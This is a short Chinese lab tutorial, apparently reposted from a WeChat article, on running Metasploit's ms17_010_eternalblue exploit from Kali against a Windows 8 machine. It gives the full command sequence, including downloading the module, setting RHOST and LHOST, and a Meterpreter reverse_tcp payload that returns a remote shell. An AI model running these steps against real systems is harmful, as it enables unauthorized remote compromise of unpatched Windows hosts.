# MSF中使用ms17-010的EXP

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzUyMTA0MjQ4NA==&mid=2247484990&idx=1&sn=3860e89ae85258d3113438c35ee4e386&chksm=f9e06965ce97e073b1230054117f5917746bc53f7a6efd9267ca4ee36e0acbc1d24ac3b03f40&scene=126&sessionid=1681663482#rd](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247484990&idx=1&sn=3860e89ae85258d3113438c35ee4e386&chksm=f9e06965ce97e073b1230054117f5917746bc53f7a6efd9267ca4ee36e0acbc1d24ac3b03f40&scene=126&sessionid=1681663482#rd)

攻击机器：kali 64位

  

目标机器：windows 8 64位

  

首先我们把模块下载到对应的目录(kali下metasploit存放模块的目录是/usr/share/metasploit-framework/modules/)  
cd /usr/share/metasploit-framework/modules/exploits/windows/smb/

wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/smb/ms17\_010\_eternalblue.rb

![](../Images/8c14ef181430f7c55702f234bffeeffb.png)

  

这里模块引用了一个ruby\_smb的插件，所以我们需要安装这个插件。

![](../Images/714c8241ce87912bdd5e2502ee2599f6.png)

  

安装的命令：gem install ruby\_smb

  

顺便升级一下msf

  

msfupdate

  

升级完成之后，我们启动msf，并选择该模块。

  

msfconsole -qx "use exploit/windows/smb/ms17\_010\_eternalblue"

![](../Images/3c3560031221c3bb3936c289f7df3e25.png)

设置目标系统的IP和payload。

  

set RHOST 192.168.146.142

  

set payload windows/x64/meterpreter/reverse\_tcp

  

set LHOST 192.168.142.131

![](../Images/8697df86e3444c29df81e1fb8781d6fe.png)

exploit执行攻击，成功返回会话。

![](../Images/0acf9a2806ec8080453a2170afa816bc.png)

不执行shell的话，是无法执行net user 的

![](../Images/ae2078e46ed31d0530d6c25911997b77.png)

文字显示都乱码，但是执行是成功的

![](../Images/f19590584498879eefb9e3f3150d049c.png)
